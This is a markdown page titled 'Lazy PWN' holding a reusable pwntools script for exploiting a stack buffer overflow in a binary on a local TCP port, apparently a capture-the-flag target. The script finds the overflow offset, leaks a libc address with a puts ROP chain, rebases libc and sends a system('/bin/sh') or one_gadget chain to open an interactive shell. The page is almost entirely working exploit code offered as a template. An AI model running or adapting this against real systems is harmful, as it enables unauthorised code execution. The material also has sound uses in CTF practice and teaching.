# Lazy PWN

## Auto Find LIBC :)

```python
from pwn import *

context.arch = 'amd64'
# context.log_level = 'debug'
###################
### CONNECTION ####
###################
LOCAL = False

REMOTETTCP = True
HOST = 'localhost'
PORT = 22000

REMOTESSH = False

GDB = False

USE_ONE_GADGET = False

LOCAL_BIN = "./main"
LIBC = "" #ELF("/lib/x86_64-linux-gnu/libc.so.6") #Set library path when know it
LIBC_PATH = "./libc-b2b.so"
LIBC = ELF(LIBC_PATH)
ENV = {"LD_PRELOAD": LIBC} if LIBC else {}

if LOCAL:
    P = process(LOCAL_BIN, env=ENV) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTETTCP:
    P = remote(HOST,PORT) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example "break *main"
    gdb.attach(P.pid, "b *main")

#########################
#### OFFSET FINDER ######
#########################

OFFSET = b"" #b"A"*264
OFFSET = b"A" * 72
if OFFSET == b"":
    if REMOTETTCP:
        log.warning('you are on remote, change to local')
        exit(1)
    payload = cyclic(150)
    P.sendlineafter("idea?", payload)
    P.wait()
    core = P.corefile
    offset = cyclic_find(core.fault_addr)
    log.info(f"Offset found at: {offset}")
    P.interactive()
    exit(1)


####################
### Find Gadgets ###
####################
try:
    libc_func = "puts"
    PUTS_PLT = ELF_LOADED.plt['puts'] #PUTS_PLT = ELF_LOADED.symbols["puts"] # This is also valid to call puts
except:
    libc_func = "printf"
    PUTS_PLT = ELF_LOADED.plt['printf']

MAIN_PLT = ELF_LOADED.symbols['main']
POP_RDI = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (ROP_LOADED.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
log.info("ret gadget: " + hex(RET))


########################
### Find LIBC offset ###
########################

def generate_payload_aligned(rop):
    payload1 = OFFSET + rop
    if (len(payload1) % 16) == 0:
        return payload1

    else:
        payload2 = OFFSET + p64(RET) + rop
        if (len(payload2) % 16) == 0:
            log.info("Payload aligned successfully")
            return payload2
        else:
            log.warning(f"I couldn't align the payload! Len: {len(payload1)}")
            return payload1


def get_addr(libc_func):
    FUNC_GOT = ELF_LOADED.got[libc_func]
    log.info(libc_func + " GOT @ " + hex(FUNC_GOT))
    # Create rop chain
    rop1 = p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
    rop1 = generate_payload_aligned(rop1)

    # Send our rop-chain payload
    #P.sendlineafter("dah?", rop1) #Use this to send the payload when something is received
    print(P.clean()) # clean socket buffer (read all and print)
    P.sendline(rop1)

    # If binary is echoing back the payload, remove that message
    recieved = P.recvline(False)
    if OFFSET[:30] in recieved:
        recieved = P.recvline()

    # Parse leaked address
    log.info(f"Len rop1: {len(rop1)}")
    leak = u64(recieved.ljust(8, b"\x00"))
    log.info(f"Leaked LIBC address,  {libc_func}: {hex(leak)}")

    # Set lib base address
    if LIBC:
        LIBC.address = leak - LIBC.symbols[libc_func] #Save LIBC base
        print("If LIBC base doesn't end end 00, you might be using an icorrect libc library")
        log.info("LIBC base @ %s" % hex(LIBC.address))

    # If not LIBC yet, stop here
    else:
        print("TO CONTINUE) Find the LIBC library and continue with the exploit... (https://LIBC.blukat.me/ or https://libc.rip/)")
        P.interactive()

    return hex(leak)

get_addr(libc_func) #Search for puts address in memmory to obtain LIBC base



#############################
#### FINAL EXPLOITATION #####
#############################

## Via One_gadget (https://github.com/david942j/one_gadget)
# gem install one_gadget
def get_one_gadgets(libc):
    import string, subprocess
    args = ["one_gadget", "-r"]
    if len(libc) == 40 and all(x in string.hexdigits for x in libc.hex()):
        args += ["-b", libc.hex()]
    else:
        args += [libc]
    try:
        one_gadgets = [int(offset) for offset in subprocess.check_output(args).decode('ascii').strip().split()]
    except:
        print("One_gadget isn't installed")
        one_gadgets = []
    return

rop2 = b""
if USE_ONE_GADGET:
    one_gadgets = get_one_gadgets(LIBC)
    if one_gadgets:
        rop2 = p64(one_gadgets[0]) + "\x00"*100 #Usually this will fullfit the constrains

## Normal/Long exploitation
if not rop2:
    BINSH = next(LIBC.search(b"/bin/sh")) #Verify with find /bin/sh
    SYSTEM = LIBC.sym["system"]
    EXIT = LIBC.sym["exit"]

    log.info("POP_RDI %s " % hex(POP_RDI))
    log.info("bin/sh %s " % hex(BINSH))
    log.info("system %s " % hex(SYSTEM))
    log.info("exit %s " % hex(EXIT))

    rop2 = p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) #p64(EXIT)
    rop2 = generate_payload_aligned(rop2)


print(P.clean())
P.sendline(rop2)

P.interactive() #Interact with your shell :)
```
